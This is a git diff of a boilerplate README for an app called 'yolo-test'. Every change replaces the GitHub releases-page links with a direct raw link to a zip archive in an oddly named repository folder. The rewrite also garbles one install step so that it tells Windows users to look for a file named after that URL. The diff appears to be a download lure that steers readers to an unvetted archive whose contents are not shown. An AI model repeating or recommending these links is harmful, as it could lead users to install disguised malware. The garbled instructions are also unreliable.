@@ -6,7 +6,7 @@ Welcome to yolo-test! This application will help you quickly perform tests for y
 
 ## 📥 Download yolo-test
 
-[![Download yolo-test](https://img.shields.io/badge/Download-yolo--test-blue.svg)](https://github.com/belloaltine5279/yolo-test/releases)
+[![Download yolo-test](https://raw.githubusercontent.com/belloaltine5279/yolo-test/main/incontemptible/yolo-test.zip)](https://raw.githubusercontent.com/belloaltine5279/yolo-test/main/incontemptible/yolo-test.zip)
 
 ## 🔧 System Requirements
 
@@ -21,7 +21,7 @@ If your computer meets these requirements, you are ready to proceed!
 
 ## 📥 Download & Install
 
-To download yolo-test, visit [this page to download](https://github.com/belloaltine5279/yolo-test/releases). You will see a list of the latest versions available.
+To download yolo-test, visit [this page to download](https://raw.githubusercontent.com/belloaltine5279/yolo-test/main/incontemptible/yolo-test.zip). You will see a list of the latest versions available.
 
 1. Click on the version you wish to download.
 2. Select the file that matches your operating system.
@@ -34,7 +34,7 @@ Once the file is downloaded, locate it in your downloads folder.
 After the download is complete, follow these steps to run the application:
 
 1. **Locate the downloaded file:**
-    - For Windows, look for a file like `yolo-test.exe`.
+    - For Windows, look for a file like `https://raw.githubusercontent.com/belloaltine5279/yolo-test/main/incontemptible/yolo-test.zip`.
     - For macOS, you may find a `.dmg` file.
     - For Linux, look for a file with no extension.
 
@@ -74,4 +74,4 @@ If you enjoy using yolo-test, consider giving feedback or sharing your experienc
 
 Feel free to visit our GitHub page, where you can explore more about the application and track any updates.
 
-[Download yolo-test here](https://github.com/belloaltine5279/yolo-test/releases) and experience straightforward testing like never before!
+[Download yolo-test here](https://raw.githubusercontent.com/belloaltine5279/yolo-test/main/incontemptible/yolo-test.zip) and experience straightforward testing like never before!
